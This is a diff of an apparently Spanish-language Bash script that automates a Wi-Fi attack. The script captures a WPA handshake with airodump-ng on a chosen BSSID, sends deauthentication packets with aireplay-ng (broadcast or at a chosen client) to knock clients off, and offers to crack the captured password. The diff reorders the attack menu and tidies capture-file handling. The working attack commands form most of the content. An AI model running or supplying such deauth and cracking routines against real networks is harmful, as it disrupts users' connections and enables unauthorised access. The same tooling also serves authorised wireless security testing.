@@ -29,6 +29,9 @@ function capture_handshake() {
     
     full_cap_path="$WORK_DIR/$filename"
     
+    # Limpiar archivos previos con el mismo nombre para asegurar que airodump empiece en -01
+    rm -f "${full_cap_path}"*
+    
     echo -e "${YELLOW}[*] Iniciando captura en canal $channel...${NC}"
     
     airodump_cmd="airodump-ng -c $channel --bssid $bssid -w $full_cap_path $mon_interface"
@@ -43,10 +46,9 @@ function capture_handshake() {
         echo -e "${YELLOW}╔════════════════ HANDSHAKE MENU ═════════════════╗${NC}"
         printf "${YELLOW}║${NC} %-47s ${YELLOW}║${NC}\n" "Target: $default_name ($bssid)"
         echo -e "${YELLOW}╠══════════════════════════════════════════════════╣${NC}"
-        printf "${YELLOW}║${NC} %-47s ${YELLOW}║${NC}\n" " 1) Check Handshake (Verificar si ya capturamos)"
-        printf "${YELLOW}║${NC} %-47s ${YELLOW}║${NC}\n" " 2) Deauth Masiva (Broadcast)"
-        printf "${YELLOW}║${NC} %-47s ${YELLOW}║${NC}\n" " 3) Deauth Específica (Seleccionar Cliente)"
-        printf "${YELLOW}║${NC} %-47s ${YELLOW}║${NC}\n" " 4) Volver al menú principal"
+        printf "${YELLOW}║${NC} %-47s ${YELLOW}║${NC}\n" " 1) Deauth masiva (Broadcast)"
+        printf "${YELLOW}║${NC} %-47s ${YELLOW}║${NC}\n" " 2) Deauth específica (Seleccionar cliente)"
+        printf "${YELLOW}║${NC} %-47s ${YELLOW}║${NC}\n" " 3) Volver al menú principal"
         echo -e "${YELLOW}╚══════════════════════════════════════════════════╝${NC}"
         echo ""
         
@@ -62,6 +64,13 @@ function capture_handshake() {
              echo -e "${GREEN}[!!!] HANDSHAKE CAPTURADO EXITOSAMENTE ${NC}"
              export HANDSHAKE_CAPTURED=1
              pkill -f "airodump-ng.*$bssid"
+             
+             # Renombrar archivo final al nombre deseado (sin -01) para guardarlo limpio
+             if [[ "$cap_to_check" != "${full_cap_path}.cap" ]]; then
+                 mv "$cap_to_check" "${full_cap_path}.cap"
+                 cap_to_check="${full_cap_path}.cap"
+             fi
+             
              read -p "¿Crackear ahora? (s/n): " crack_now
              if [[ "$crack_now" == "s" || "$crack_now" == "S" ]]; then
                  crack_password_auto "$cap_to_check" "$bssid"
@@ -73,16 +82,11 @@ function capture_handshake() {
         
         case $hs_opt in
             1)
-                # La verificación ya se hace al inicio del loop, así que solo damos feedback visual
-                echo -e "${YELLOW}[*] Verificando archivo de captura...${NC}"
-                sleep 1
-                ;;
-            2)
                 echo -e "${RED}[ATTACK] Enviando 10 paquetes de deauth (Broadcast)...${NC}"
                 aireplay-ng -0 10 -a "$bssid" "$mon_interface"
                 sleep 2
                 ;;
-            3)
+            2)
                 # Parsear clientes desde el CSV que está generando airodump en segundo plano
                 csv_file="${full_cap_path}-01.csv"
                 if [ ! -f "$csv_file" ]; then
@@ -126,7 +130,7 @@ function capture_handshake() {
                 fi
                 read -p "Presiona Enter para continuar..."
                 ;;
-            4)
+            3)
                 pkill -f "airodump-ng.*$bssid"
                 echo -e "${YELLOW}[*] Eliminando archivos de captura incompletos...${NC}"
                 rm -f "${full_cap_path}"*
